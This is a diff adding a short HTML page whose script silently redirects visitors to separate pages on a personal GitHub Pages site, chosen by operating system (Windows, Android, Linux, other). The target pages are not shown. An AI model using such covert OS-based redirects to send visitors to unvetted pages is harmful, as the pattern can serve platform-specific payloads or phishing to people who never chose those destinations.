@@ -1,0 +1,30 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Redirect based on User Agent</title>
+  <script>
+    // JavaScript to check user agent and redirect to different websites
+    window.onload = function() {
+      var userAgent = navigator.userAgent.toLowerCase();
+
+      if (userAgent.includes("windows")) {
+        window.location.href = "https://khilesh114.github.io/boot/windo.html";
+      } else if (userAgent.includes("android")) {
+        window.location.href = "https://khilesh114.github.io/boot/android.html";
+      } else if (userAgent.includes("linux")) {
+        window.location.href = "https://khilesh114.github.io/boot/linux.html";
+      } else {
+        // Default redirection if the user agent is not Windows, Android, or Linux
+        window.location.href = "https://khilesh114.github.io/boot/custumboot.html";
+      }
+    };
+  </script>
+</head>
+<body>
+  <!-- Content for users who do not get redirected -->
+  
+</body>
+</html>
+
